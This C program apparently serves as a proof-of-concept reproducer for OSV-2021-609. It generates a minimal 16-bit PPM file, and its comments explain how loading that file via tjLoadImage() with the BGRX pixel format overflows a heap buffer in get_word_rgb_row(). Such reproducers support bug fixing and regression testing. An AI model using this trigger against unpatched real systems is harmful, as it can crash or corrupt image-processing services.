/*
 * PoC input generator for OSV-2021-609
 *
 * Creates a minimal 16-bit PPM file (P6 binary, maxval=65535).
 * This is a valid PPM that, when loaded via tjLoadImage() with a
 * 4-byte-per-pixel format (TJPF_BGRX), triggers the heap-buffer-overflow
 * in get_word_rgb_row() because the vulnerable code advances the output
 * pointer by 3 bytes per pixel (*ptr++) instead of 4 (the actual pixel
 * stride for JCS_EXT_BGRX).
 *
 * Format: "P6\n<W> <H>\n65535\n" followed by W*H*3*2 bytes of pixel data
 * (each of R,G,B is a 16-bit big-endian value).
 */
#include <stdio.h>
#include <stdlib.h>

int main(void)
{
    const int width  = 8;
    const int height = 8;
    const char *path = "poc_input.ppm";

    FILE *f = fopen(path, "wb");
    if (!f) {
        perror("fopen");
        return 1;
    }

    /* PPM P6 header with maxval=65535 (forces 16-bit / "word" path) */
    fprintf(f, "P6\n%d %d\n65535\n", width, height);

    /* Pixel data: 3 channels x 2 bytes each = 6 bytes per pixel.
     * Values are arbitrary; the overflow does not depend on pixel values,
     * only on the fact that maxval > 255 selects get_word_rgb_row. */
    for (int y = 0; y < height; y++) {
        for (int x = 0; x < width; x++) {
            unsigned char pixel[6] = {
                0x00, 0xFF,   /* R = 255  (big-endian 16-bit) */
                0x00, 0x80,   /* G = 128 */
                0x00, 0x40    /* B = 64  */
            };
            fwrite(pixel, 1, sizeof(pixel), f);
        }
    }

    fclose(f);
    printf("Generated %s (%dx%d, 16-bit PPM, maxval=65535)\n",
           path, width, height);
    return 0;
}
